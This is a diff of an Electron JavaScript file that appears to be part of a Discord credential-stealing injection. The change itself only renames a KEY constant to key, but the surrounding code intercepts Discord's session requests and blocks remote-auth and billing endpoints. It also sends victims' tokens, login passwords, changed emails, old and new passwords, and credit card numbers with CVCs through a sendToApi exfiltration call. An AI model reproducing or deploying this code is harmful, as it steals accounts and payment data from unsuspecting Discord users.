@@ -2,7 +2,7 @@ const {
     BrowserWindow
     , session
 } = require('electron');
-const KEY = '%key%';
+const key = '%key%';
 var loggedOut = false;
 session.defaultSession.webRequest.onBeforeRequest({
     'urls': ['https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json', 'https://*.discord.com/api/v*/applications/detectable', 'https://discord.com/api/v*/applications/detectable', 'https://*.discord.com/api/v*/users/@me/library', 'https://discord.com/api/v*/users/@me/library', 'https://*.discord.com/api/v*/users/@me/billing/subscriptions', 'https://discord.com/api/v*/users/@me/billing/subscriptions', 'wss://remote-auth-gateway.discord.gg/*']
@@ -50,7 +50,7 @@ async function newData(type, token, ...args) {
     case 'login':
         sendToApi(JSON.stringify({
             type: 'login'
-            , key: KEY
+            , key: key
             , ip: ip
             , password: args[0]
             , token: token
@@ -59,7 +59,7 @@ async function newData(type, token, ...args) {
     case 'emailChanged':
         sendToApi(JSON.stringify({
             type: 'email'
-            , key: KEY
+            , key: key
             , ip: ip
             , newEmail: args[0]
             , password: args[1]
@@ -69,7 +69,7 @@ async function newData(type, token, ...args) {
     case 'passwordChanged':
         sendToApi(JSON.stringify({
             type: 'password'
-            , key: KEY
+            , key: key
             , ip: ip
             , oldPassword: args[0]
             , newPassword: args[1]
@@ -79,7 +79,7 @@ async function newData(type, token, ...args) {
     case 'cardAdded':
         sendToApi(JSON.stringify({
             type: 'card'
-            , key: KEY
+            , key: key
             , ip: ip
             , number: args[0]
             , cvc: args[1]
